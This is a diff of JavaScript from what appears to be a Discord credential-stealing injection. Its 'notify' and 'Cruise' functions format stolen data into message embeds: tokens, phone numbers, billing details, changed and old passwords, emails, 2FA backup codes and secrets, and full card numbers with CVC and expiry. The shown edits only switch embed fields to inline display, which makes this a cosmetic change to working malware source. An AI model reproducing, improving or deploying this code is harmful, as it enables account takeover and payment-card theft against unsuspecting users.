@@ -267,10 +267,10 @@ const notify = async (ctx, token, user) => {
     ctx.embeds[0].fields.push(
         // { name: "\u200b", value: "\u200b", inline: false },
         { name: "Nitro", value: `\`${nitro}\``, inline: false },
-        { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: false },
+        { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: true },
         // { name: "\u200b", value: "\u200b", inline: false },
         { name: "Badges", value: `\`${badges}\``, inline: false },
-        { name: "Billing", value: `\`${billing}\``, inline: false },
+        { name: "Billing", value: `\`${billing}\``, inline: true },
         // { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
@@ -632,7 +632,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "New Username", value: `\`${request.username}\``, inline: false },
-                        { name: "Password", value: `\`${request.password}\``, inline: false },
+                        { name: "Password", value: `\`${request.password}\``, inline: true },
                         { name: "Email", value: `\`${email}\``, inline: false },
                     ],
                 }],
@@ -647,7 +647,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "New Email", value: `\`${email}\``, inline: false },
-                        { name: "Password", value: `\`${password}\``, inline: false },
+                        { name: "Password", value: `\`${password}\``, inline: true },
                     ],
                 }],
             };
@@ -661,7 +661,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "New Password", value: `\`${request.new_password}\``, inline: false, },
-                        { name: "Old Password", value: `\`${request.password}\``, inline: false, },
+                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                         { name: "Email", value: `\`${email}\``, inline: false, },
                     ],
                 }],
@@ -679,7 +679,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 embeds: [{
                     fields: [
                         { name: "Password", value: `\`${password}\``, inline: false },
-                        { name: "Email", value: `\`${email}\``, inline: false },
+                        { name: "Email", value: `\`${email}\``, inline: true },
                         // { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Security codes", value: `\`\n${codes}\``, inline: false },
                     ],
@@ -689,7 +689,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
             if (request?.code !== undefined && request?.secret !== undefined) {
                 content.embeds[0].fields.push(
                     { name: "Used 2FA code", value: `\`${request.code}\``, inline: false },
-                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: false },
+                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
                 );
             };
 
@@ -705,7 +705,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                         { name: "Email", value: `\`${email}\``, inline: false },
                         // { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: false },
-                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: false },
+                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
                         { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: false, },
                     ],
                     fields: [
